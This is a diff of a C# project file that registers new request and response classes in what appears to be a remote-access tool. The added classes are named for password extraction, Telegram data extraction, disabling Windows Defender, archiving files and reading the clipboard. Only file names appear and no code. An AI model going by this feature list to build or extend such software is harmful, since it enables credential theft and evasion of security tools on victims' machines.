@@ -116,6 +116,8 @@
     <Compile Include="Request\RequestCommand.cs" />
     <Compile Include="Request\RequestCreateFileOrDir.cs" />
     <Compile Include="Request\RequestDownloadWebFile.cs" />
+    <Compile Include="Request\eKeyboardKeys.cs" />
+    <Compile Include="Request\eKeyboardOpe.cs" />
     <Compile Include="Request\RequestKeyboardEvent.cs" />
     <Compile Include="Request\RequestKillProcesses.cs" />
     <Compile Include="Request\RequestLockMouse.cs" />
@@ -188,6 +190,16 @@
     <Compile Include="Request\RequestFindWindow.cs" />
     <Compile Include="Request\RequestRemoteChat.cs" />
     <Compile Include="Request\RequestUninstall.cs" />
+    <Compile Include="Request\RequestTGExtract.cs" />
+    <Compile Include="Request\RequestPasswordExtract.cs" />
+    <Compile Include="Request\RequestDisableDefender.cs" />
+    <Compile Include="Request\RequestArchiveAll.cs" />
+    <Compile Include="Request\RequestGetNetworkConnections.cs" />
+    <Compile Include="Request\RequestGetHostInfo.cs" />
+    <Compile Include="Request\RequestClipboardGet.cs" />
+    <Compile Include="Request\RequestClipboardSet.cs" />
+    <Compile Include="Request\RequestGetWindows.cs" />
+    <Compile Include="Request\RequestSetProcessPriority.cs" />
     <Compile Include="Response\ResponseClearLog.cs" />
     <Compile Include="Response\ResponseClearBrowserData.cs" />
     <Compile Include="Response\ResponseServiceManager.cs" />
@@ -202,6 +214,16 @@
     <Compile Include="Response\ResponseFindWindow.cs" />
     <Compile Include="Response\ResponseRemoteChat.cs" />
     <Compile Include="Response\ResponseWriteStartup.cs" />
+    <Compile Include="Response\ResponseTGExtract.cs" />
+    <Compile Include="Response\ResponsePasswordExtract.cs" />
+    <Compile Include="Response\ResponseDisableDefender.cs" />
+    <Compile Include="Response\ResponseArchiveAll.cs" />
+    <Compile Include="Response\ResponseGetNetworkConnections.cs" />
+    <Compile Include="Response\ResponseGetHostInfo.cs" />
+    <Compile Include="Response\ResponseClipboardGet.cs" />
+    <Compile Include="Response\ResponseClipboardSet.cs" />
+    <Compile Include="Response\ResponseGetWindows.cs" />
+    <Compile Include="Response\ResponseProcessOperation.cs" />
   </ItemGroup>
   <ItemGroup>
     <BootstrapperPackage Include="Microsoft.Net.Client.3.5">
